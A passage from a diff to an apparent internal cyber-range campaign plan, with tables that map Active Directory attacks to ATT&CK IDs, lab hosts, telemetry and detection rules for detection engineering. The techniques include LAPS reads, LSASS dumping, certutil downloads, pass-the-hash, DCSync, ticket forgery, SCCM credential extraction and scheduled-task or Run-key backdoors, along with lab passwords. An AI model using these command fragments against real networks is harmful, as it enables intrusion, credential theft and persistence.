+<td><strong>Source machine</strong></td>
+<td>provisioning (LDAP query)</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>any LAPS-managed computer (dc01, dc02, dc03, mbr01, mbr02)</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>any domain with LAPS deployed</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Local administrator password → local admin on every LAPS-managed machine</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4662 (AD object access — <code>ObjectType: %{bf967aba-0de6-11d0-a285-00aa003049e2}</code> = computer, <code>AccessMask: 0x10</code> = Read Property), Zeek ldap.log (large-scale read of <code>ms-Mcs-AdmPwd</code>)</td>
+</tr>
+<tr>
+<td><strong>Enhancement</strong></td>
+<td>Bulk export from <code>ntds.dit</code> after Phase 6 DCSync via DSIternals <code>Get-ADDBAccount -LapsPasswords</code> (see Campaign_suggestions #87)</td>
+</tr>
+<tr>
+<td><strong>Tool</strong></td>
+<td>Native <code>ldapsearch</code> / PowerShell <code>Get-ADComputer</code> / <code>DSInternals</code> for bulk</td>
+</tr>
+</tbody>
+</table>
+<h4>3.5M — Azure AD Connect DPAPI Dump (T1555)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>⏳ Not yet tested</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1555 (Credentials from Password Stores)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>adconnectdump extracts MSOL account credentials from Cloud Sync / Azure AD Connect agent using DPAPI</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>CADRE has Cloud Sync agent on dc01. MSOL account credentials (used to sync on-prem AD → Entra ID) are stored using DPAPI. SYSTEM on dc01 can extract them via adconnectdump → use ROADtools to authenticate to Entra ID → enumerate cloud users/groups/apps.</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on dc01 (currently CADRE has SYSTEM on mbr01 via Phase 3 chain — pivoting to dc01 requires lateral escalation, e.g., Pass-the-Hash or DCSync)</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (ROADtools) + adconnectdump on dc01</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>dc01 (192.168.77.10)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>MSOL credentials → Entra ID access → cloud-side recon (users, groups, applications, conditional access policies)</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 1 (adconnectdump.exe or Python adconnectdump.py), File create events on <code>C:\ProgramData\Microsoft\AzureAD Connect\...</code> or <code>C:\ProgramData\Microsoft\AzureAD\</code> (Cloud Sync), Entra ID sign-in log (MSOL from unusual IP — out of CADRE scope)</td>
+</tr>
+<tr>
+<td><strong>Bridge to Plan 11</strong></td>
+<td>This is the entry point from on-prem (Phase 3 SYSTEM) to EntraGoat (Plan 11) — on-prem compromise unlocks cloud compromise</td>
+</tr>
+<tr>
+<td><strong>Tool</strong></td>
+<td><a href="https://github.com/fox-it/adconnectdump">github.com/fox-it/adconnectdump</a></td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td><a href="https://dirkjanm.io/active-directory-azure-ad-connect-vulnerabilities/">dirkjanm.io — AAD Connect Vulnerabilities (2019)</a></td>
+</tr>
+</tbody>
+</table>
+<h4>3.5N — UnCanny LPE: Non-Admin → SYSTEM via InstallService (T1068, T1574.001)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>🔬 Deferred — gated on Developer Mode + Samba setup (per user 2026-06-19)</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1068 (Exploitation for Privilege Escalation), T1574.001 (Hijack Execution Flow: DLL Side-Loading)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Loose-file AppX registration with UNC <code>InstalledLocation</code> → SYSTEM <code>InstallService.exe</code> calls <code>LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)</code> → DllMain runs as <code>NT AUTHORITY\SYSTEM</code> inside <code>svchost.exe</code></td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Standard user (no admin) registers a loose-file AppX package pointing at attacker UNC share → attacker serves a real DLL via Samba (impacket returns <code>ERROR_INVALID_HANDLE</code> for loadable images) → SYSTEM loads DLL → DllMain spawns shell. <strong>Direct SYSTEM from non-admin</strong> — bypasses GodPotato/PrintSpoofer chain.</td>
+</tr>
+<tr>
+<td><strong>Pre-conditions</strong></td>
+<td>(1) Developer Mode enabled on target: <code>HKLM\...\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1</code>. (2) <code>InstallService.exe</code> + <code>AppXSvc</code> running (default). (3) Samba (not impacket) serving the share.</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (Kali — Samba + .NET registration via <code>Add-AppxPackage</code>)</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (or any Win 10/11 / Server 2022/2025)</td>
+</tr>
+<tr>
+<td><strong>Detection (cadre-e candidates)</strong></td>
+<td>Sysmon EID 1: <code>Add-AppxPackage -Register</code> with UNC path in command line; Sysmon EID 3: outbound SMB from <code>InstallService.exe</code> (SYSTEM) to non-RFC1918 host; ETW <code>Microsoft-Windows-COM</code> — <code>CreateInstallServiceWork</code> COM call from non-system context</td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td><a href="https://github.com/0xHossam/UnCanny">github.com/0xHossam/UnCanny</a> (0xHossam, 2026-06-19) — cloned to <code>docs/internal/references/sources/uncanny/UnCanny/</code></td>
+</tr>
+<tr>
+<td><strong>Pairs with WT094</strong></td>
+<td>WT094 = coerce variant (machine account NTLM); 3.5N = LPE variant (non-admin → SYSTEM). Both gated on Developer Mode.</td>
+</tr>
+<tr>
+<td><strong>Track</strong></td>
+<td>Track G (Parallel Tracks — Track A triggers re-evaluation)</td>
+</tr>
+</tbody>
+</table>
+<h4>H — Alternate Entry: File Delivery (WT063-068)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT063</th>
+<th>WT064</th>
+<th>WT065</th>
+<th>WT066</th>
+<th>WT067</th>
+<th>WT068</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>Initial Access — H</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Malicious LNK</td>
+<td>MSI Installer</td>
+<td>CHM Help</td>
+<td>HTML Smuggling</td>
+<td>AutoIt3 Script</td>
+<td>Malicious EXE</td>
+</tr>
+<tr>
+<td><strong>File type</strong></td>
+<td><code>.lnk</code></td>
+<td><code>.msi</code></td>
+<td><code>.chm</code></td>
+<td><code>.html</code></td>
+<td><code>.au3</code></td>
+<td><code>.exe</code></td>
+</tr>
+<tr>
+<td><strong>Execution</strong></td>
+<td>PowerShell</td>
+<td>msiexec.exe</td>
+<td>hh.exe</td>
+<td>JS Blob → payload</td>
+<td>AutoIt3.exe</td>
+<td>certutil / rundll32</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>06-member-services.yml</code> — RDP + Downloads for <code>analyst_cloud</code></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Target user</strong></td>
+<td><code>analyst_cloud</code> (cadre.local) — RDP session on mbr01</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td>provisioning serves files via HTTP :8080</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Domain joined?</strong></td>
+<td>Yes (mbr01 joined to child.cadre.local)</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Code exec as <code>analyst_cloud</code> → LSASS dump → <code>Cl0ud_An@lyst!</code></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4688; Sysmon EID 1, 11, 15; Endpt process/network; Zeek http.log</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4>G — Post-Exploit (WT090, WT083, WT082)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT090</th>
+<th>WT083</th>
+<th>WT082</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>MITRE Gap — G</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1082</td>
+<td>T1105</td>
+<td>T1003.001</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Host Recon</td>
+<td>Tool Transfer</td>
+<td>LSASS Dump</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>systeminfo; whoami /all; ipconfig</code></td>
+<td><code>certutil -urlcache -f http://...</code></td>
+<td><code>procdump -ma lsass.exe</code></td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Sysmon EID 1 (systeminfo etc)</td>
+<td>Sysmon EID 3, 1; Zeek conn</td>
+<td>Sysmon EID 10; Endpt API; WinSec 4663</td>
+</tr>
+</tbody>
+</table>
+<h3>Phase 4 — Discovery (BloodHound + LDAP)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1087, T1069, T1482</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>05-ad-attack-surface.yml</code> ACEs 1-26 = the surface BH discovers</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>Authenticated AD bind (any domain credential)</td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td>provisioning (remote) or mbr01 (local)</td>
+</tr>
+<tr>
+<td><strong>Starting cred</strong></td>
+<td>e.g., <code>svc_mssql</code></td>
+</tr>
+<tr>
+<td><strong>What it reveals</strong></td>
+<td>ACE chains, delegation, ADCS templates, SCCM, linux01 link</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4624 (LDAP bind), 4662 (LDAP query); Zeek ldap.log</td>
+</tr>
+</tbody>
+</table>
+<h3>Phase 5 — Lateral Movement</h3>
+<h4>WT004 — Unconstrained Delegation + WT017 — PrinterBug</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT004</th>
+<th>WT017</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Confirmed (12 fires)</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>Core AD</td>
+<td>Core AD</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1550</td>
+<td>T1187</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>mbr01$</code> has <code>TrustedForDelegation</code>. Rubeus captures dc02$'s incoming TGT.</td>
+<td><code>coercer --spoolsample</code> forces dc02$ to auth to mbr01 via MS-RPRN.</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>05-ad-attack-surface.yml</code> — sets <code>TrustedForDelegation</code> on mbr01$</td>
+<td><code>04-vulnerabilities.yml</code> — enables Print Spooler on dc02</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>SYSTEM on mbr01 + print spooler on dc02</td>
+<td>Cred to auth dc02 RPC + unconstrained delegation</td>
+</tr>
+<tr>
+<td><strong>Starting cred</strong></td>
+<td>SYSTEM (from SQL exec → priv esc)</td>
+<td><code>svc_mssql</code></td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td><code>dc02$</code> <strong>TGT</strong> → full child DC credential</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4662 (RPC); Zeek dce_rpc.log (opnum 1,65); Suri SID:1000050 (12 fires)</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4>WT018-020 — Non-functional Coercion Techniques</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT018</th>
+<th>WT019</th>
+<th>WT020</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>❌ Non-functional</td>
+<td>❌ Non-functional</td>
+<td>❌ Non-functional</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>MS-EFSR (PetitPotam)</td>
+<td>MS-DFSNM (DFSCoerce)</td>
+<td>MS-FSRVP (ShadowCoerce)</td>
+</tr>
+<tr>
+<td><strong>Reason</strong></td>
+<td><code>\PIPE\efsrpc</code> blocked on Server 2025</td>
+<td>SMB-pipe DCE-RPC not detectable by Suricata 8.0.5</td>
+<td>Service not available on Server 2025</td>
+</tr>
+</tbody>
+</table>
+<h4>WT021-022 — NTLM Relay</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT021</th>
+<th>WT022</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>NTLM Relay to LDAP (Shadow Credentials)</td>
+<td>NTLM Relay to SMB</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>04-vulnerabilities.yml</code> (relay conditions)</td>
+<td><code>04-vulnerabilities.yml</code> — SMB signing disabled on mbr02</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4624 (relayed); Zeek ldap.log, dce_rpc.log</td>
+<td>WinSec 4624; Zeek smb.log</td>
+</tr>
+</tbody>
+</table>
+<h4>WT094 — UnCanny Coerce: NTLM Coercion via InstallService (T1187)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>094</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>🔬 Deferred — gated on Developer Mode + playbook admin change (per user 2026-06-19)</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1187 (Forced Authentication)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Loose-file AppX registration with UNC <code>InstalledLocation</code> → SYSTEM <code>InstallService.exe</code> calls <code>LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)</code> → outbound SMB auth from target machine account</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Standard user registers a loose-file AppX package pointing at attacker UNC share → SYSTEM service loads DLL → triggers outbound SMB → attacker captures machine account NTLM on impacket-smbserver. Chain to NTLM relay (ADCS ESC8) or direct DCSync using captured hash.</td>
+</tr>
+<tr>
+<td><strong>Pre-conditions</strong></td>
+<td>(1) Developer Mode enabled on target: <code>HKLM\...\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1</code>. (2) <code>InstallService.exe</code> + <code>AppXSvc</code> running (default). (3) impacket-smbserver with patched <code>FileSystemName</code> field (XTFS → NTFS, per author's setup.sh) — AppX refuses to register on non-NTFS shares.</td>
+</tr>
+<tr>
+<td><strong>Source machine</strong></td>
+<td>provisioning (Kali — impacket-smbserver + Invoke-InstallServiceCoerce.ps1)</td>
+</tr>
+<tr>
+<td><strong>Target machine</strong></td>
+<td>mbr01 (or dc01, dc02, dc03, mbr02 — any Win 10/11 / Server 2022/2025 with Developer Mode)</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>any (machine account is the auth source, not a user)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Target machine account NTLMv1/NTLMv2 — crack with hashcat -m 13100 (RC4) or -m 19700 (AES256). Chain to DCSync or NTLM relay (ESC8).</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>Suricata SID:1000095-1000097 (cadre-coercion.rules — AppX + InstallService patterns). Sysmon EID 1: <code>Add-AppxPackage -Register</code> with UNC path. Sysmon EID 3: outbound SMB from <code>InstallService.exe</code> (SYSTEM) to non-RFC1918 host. ETW <code>Microsoft-Windows-COM</code> — <code>CreateInstallServiceWork</code> COM call.</td>
+</tr>
+<tr>
+<td><strong>Pairs with 3.5N</strong></td>
+<td>3.5N = LPE variant (non-admin → SYSTEM via DLL load). WT094 = coerce variant (capture machine account). Both gated on Developer Mode.</td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td><a href="https://github.com/0xHossam/UnCanny">github.com/0xHossam/UnCanny</a> (0xHossam, 2026-06-19) — cloned to <code>docs/internal/references/sources/uncanny/UnCanny/</code></td>
+</tr>
+<tr>
+<td><strong>Status rationale</strong></td>
+<td>Per user 2026-06-19: "document only, defer test" — kept in campaign as documented alternative until Developer Mode decision is made. Track G (Hardened Environment Variant) is the re-evaluation trigger.</td>
+</tr>
+<tr>
+<td><strong>Detection rules</strong></td>
+<td>Already drafted in plan1.7 §14 (Suricata SID 1000095-1000097 + Elastic KQL). Ready to deploy before testing.</td>
+</tr>
+</tbody>
+</table>
+<h4>WT005-006 — Constrained Delegation</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT005</th>
+<th>WT006</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>w/ Protocol Transition (S4U2Self+S4U2Proxy)</td>
+<td>w/o Protocol Transition (S4U2Proxy only)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>mbr02$</code> delegates to <code>cifs/dc03</code> + <code>ldap/dc03</code></td>
+<td><code>svc_sccm</code> delegates to <code>HTTP/mbr02.range.local</code></td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>05-ad-attack-surface.yml</code> — delegation on mbr02$</td>
+<td><code>05-ad-attack-surface.yml</code> — delegation on svc_sccm</td>
+</tr>
+</tbody>
+</table>
+<h4>WT007 — RBCD</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>007</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active — alternative to unconstrained delegation</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Resource-Based Constrained Delegation</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Create fake computer, set RBCD on target, S4U2Proxy as DA</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td>N/A — RBCD abuse; requires GenericWrite on target computer</td>
+</tr>
+</tbody>
+</table>
+<h4>G — Lateral Movement (WT084-087)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT084</th>
+<th>WT085</th>
+<th>WT086</th>
+<th>WT087</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>MITRE Gap — G</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1047</td>
+<td>T1021.006</td>
+<td>T1021.001</td>
+<td>T1550.002</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>WMI Lateral</td>
+<td>WinRM Lateral</td>
+<td>RDP Restricted Admin</td>
+<td>Pass-the-Hash</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>wmic /node: target process call create</code></td>
+<td><code>winrs -r:target whoami</code></td>
+<td><code>mstsc /restrictedadmin</code></td>
+<td><code>impacket-wmiexec -hashes</code></td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>SyEID 1 (wmic.exe), 3; WE 4624/4688</td>
+<td>SyEID 1 (winrs.exe), 3; PS 4104</td>
+<td>WE 4624 Type 10</td>
+<td>WE 4624 Type 3 (NTLM); SyEID 3</td>
+</tr>
+</tbody>
+</table>
+<h3>Phase 6 — Privilege Escalation: DCSync (WT009)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>009</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active (confirmed — 63 fires per testing)</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1003.006 (DCSync via DRSUAPI)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>MS-DRSR replication to extract domain secrets. Requires Replicate-Changes rights (default: DA, EA, DC).</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>13+14 (eng_agentic → DC=cadre: Get-Changes + Get-Changes-All) — alternative misconfig</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>DA credential or DCSync rights; use Kerberos TGT or NTLM</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>Child krbtgt + all user/computer hashes → <strong>Domain Admin</strong> child.cadre.local</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WinSec 4662 (DS Replication); SyEID 3; Zeek dce_rpc.log (DRSUAPI); Suri SID:1000002 (63 fires)</td>
+</tr>
+</tbody>
+</table>
+<h3>Phase 7 — Forest Trust Escalation (WT010-012)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT010</th>
+<th>WT011</th>
+<th>WT012</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active (stealth/alt)</td>
+<td>✅ Active (stealth/alt)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Golden Ticket + SID History</td>
+<td>Silver Ticket (targeted)</td>
+<td>Diamond Ticket (stealth)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Forge TGT with child krbtgt; inject root EA SID via ExtraSids</td>
+<td>Forge service-specific TGS — no KDC contact</td>
+<td>Modify legit TGT rather than forge</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>00-domain-deploy.yml</code> — parent-child trust (no SID filtering)</td>
+<td>N/A — requires any service NTHASH</td>
+<td>N/A</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td>Child krbtgt + child SID + root EA SID</td>
+<td>Service account NTHASH</td>
+<td>krbtgt AES256 + legit TGT</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td>EA in cadre.local → root krbtgt</td>
+<td>Limited to specific service</td>
+<td>Same as golden but stealthier</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WE 4624/4672 (EA logon); Zeek kerberos.log</td>
+<td>No AS-REQ/AS-REP traffic</td>
+<td>Legit TGT origin — fewer anomalies</td>
+</tr>
+</tbody>
+</table>
+<h4>G — Persistence (WT088, WT089)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT088</th>
+<th>WT089</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Stream</strong></td>
+<td>MITRE Gap — G</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1053.005 (Scheduled Task)</td>
+<td>T1547.001 (Registry Run Key)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>schtasks /create /tn "Persist" /tr "powershell..." /sc onlogon /ru SYSTEM</code></td>
+<td><code>reg add HKLM\...\Run /v Backdoor /t REG_SZ /d "powershell..."</code></td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WE 4698; SyEID 1 (schtasks.exe)</td>
+<td>WE 4688 (reg.exe); SyEID 12-13; Endpt registry</td>
+</tr>
+</tbody>
+</table>
+<h3>Phase 8 — Cross-Forest + External Domain (WT033-039)</h3>
+<h4>WT033 — Cross-Forest Kerberoast</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>033</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Cross-forest Kerberoast via forest trust</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>From cadre.local DA, request TGS for range.local SPNs. Trust handles cross-forest referral.</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>00-domain-deploy.yml</code> — forest trust cadre ↔ range</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td><code>s3rv1c3_SCCM!</code> (svc_sccm — SCCM Full Admin)</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WE 4769 (cross-realm TGS); Zeek kerberos.log (cross-realm); Suri SID:1000015</td>
+</tr>
+</tbody>
+</table>
+<h4>WT034 — SCCM NAA Extraction</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>034</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>SCCM NAA credential extraction</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>With svc_sccm as SCCM Full Admin, extract NAA cred from site DB. <code>svc_naa</code> is DA in range.local (over-privileged).</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>10-sccm-verify.yml</code> — NAA config + over-privilege. ACE#23 alternative bridge.</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>23 (analyst_osint → svc_naa: GenericAll)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td><code>N@A_s3rv1c3!</code> → Domain Admin range.local → DCSync dc03 → all 3 domains</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WE 4624, 4688 (SharpSCCM); SyEID 1, 3 (SQL to SCCM DB); PS 4104</td>
+</tr>
+</tbody>
+</table>
+<h4>SCCM Chain (WT035-039)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT035</th>
+<th>WT036</th>
+<th>WT037</th>
+<th>WT038</th>
+<th>WT039</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>PXE Boot Abuse</td>
+<td>Client Push Relay</td>
+<td>CMPivot Abuse</td>
+<td>App Deployment</td>
+<td>Site Takeover</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Extract boot image + task seq vars</td>
+<td>Relay client push to SMB</td>
+<td>Arbitrary queries on all clients</td>
+<td>Deploy malicious app to all</td>
+<td>Execute on site server</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>10-sccm-verify.yml</code> — all SCCM features</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong>Prerequisite</strong></td>
+<td><code>svc_sccm</code> as SCCM Full Admin</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>SyEID 1, 3, 11; Zeek smb.log, http.log</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<h4>Auxiliary (WT030, WT049)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT030</th>
+<th>WT049</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>WSUS Abuse</td>
+<td>VSC Enrollment</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>range.local</td>
+<td>range.local</td>
+</tr>
+</tbody>
+</table>
+<h4>G — Collection (WT091, WT092)</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>WT091</th>
+<th>WT092</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Status</strong></td>
+<td>✅ Active</td>
+<td>✅ Active</td>
+</tr>
